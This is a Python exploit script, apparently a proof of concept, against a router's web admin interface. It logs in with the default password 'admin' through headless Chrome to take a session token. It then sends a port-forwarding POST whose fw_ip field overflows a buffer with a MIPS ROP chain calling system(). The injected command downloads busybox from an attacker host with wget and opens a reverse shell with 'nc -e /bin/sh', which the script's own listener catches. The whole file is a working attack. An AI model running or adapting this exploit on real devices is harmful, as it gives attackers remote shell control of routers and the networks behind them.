import requests
import time
import subprocess
from pwn import *
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager


sessionId = ""

def getSessionId():
    global sessionId


    options = Options()
    options.add_argument("--headless=new") 
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-gpu")
    options.add_argument("--window-size=1920x1080")  
    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
    login_url = "http://192.168.0.1/login.htm"
    
    driver.get(login_url)

    password_input = driver.find_element(By.NAME, 'password')
    password_input.send_keys("admin")
    password_input.send_keys(Keys.RETURN)
    time.sleep(2)
    driver.get('http://192.168.0.1/urlfilter.htm')
    sessionCheck_element = driver.find_element(By.NAME, "sessionCheck") 
    sessionId = sessionCheck_element.get_attribute("value")
   

    driver.quit()
    print(f'session:{sessionId}')

def attack():
    global sessionId
    io = remote('192.168.0.1', 80)
    server_process = subprocess.Popen(['python3', '-m', 'http.server'])
    
    libc_base = 0x77d0b000 
    
    cmd = b' sleep 5; wget http://192.168.0.2:8000/busybox-mipsel;chmod 777 ./busybox-mipsel;./busybox-mipsel nc 192.168.0.2 2333 -e /bin/sh;'
   
    payload_body = f'sessionCheck={sessionId}&changlist=0&service_type=FTP&external_port=24&internal_port=21&ip_subnet=192.168.0.&fw_ip='.encode()
       
    payload_body += b'a'*(0x5c-10) # buf
    payload_body += p32(0xaaaaaaaa) # s0 dummy
    payload_body += p32(libc_base + 0x00033448)  # s1 (system() address)
    payload_body += p32(0x22222222) # s2 dummy
    payload_body += p32(0x33333333) # s3 dummy
    payload_body += p32(0x44444444) # s4 dummy    
    payload_body += p32(libc_base + 0x000378d4)  # ra (ROP gadget)
    payload_body += b'b' * (0x120)  # padding
    payload_body += cmd  # Reverse Shell
    payload_body += b'&protocol=1&addPortFw=Apply&submit-url=%2Fportfw.htm'
    
    content_length = len(payload_body)
    
    payload = b"POST /boafrm/formPortFw HTTP/1.1\r\n"
    payload += b'Host: 192.168.0.1\r\n'
    payload += b'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\r\n'
    payload += b'Accept: */*\r\n'
    payload += b'Accept-Language: en-US,en;q=0.5\r\n'
    payload += b'Accept-Encoding: gzip, deflate\r\n'
    payload += b'Content-Type: application/x-www-form-urlencoded; charset=UTF-8\r\n'
    payload += b'X-Requested-With: XMLHttpRequest\r\n'
    payload += f'Content-Length: {content_length}\r\n'.encode()
    payload += b'Origin: http://192.168.0.1\r\n'
    payload += b'Connection: close\r\n'
    payload += b'Referer: http://192.168.0.1\r\n\r\n'
    
    payload = payload + payload_body
    
    io.send(payload)
    io.close()
    
    
    nc_process = subprocess.Popen(['nc', '-lvnp', '2333'])
    
    try:
        nc_process.wait()
    except KeyboardInterrupt:
        nc_process.terminate()
        server_process.terminate()

    if nc_process.returncode == 0:
        logging.info("Done")
    else:
        logging.error("Command execution failed.")


def main():
    getSessionId()
    attack()

if __name__ == '__main__':
    main()
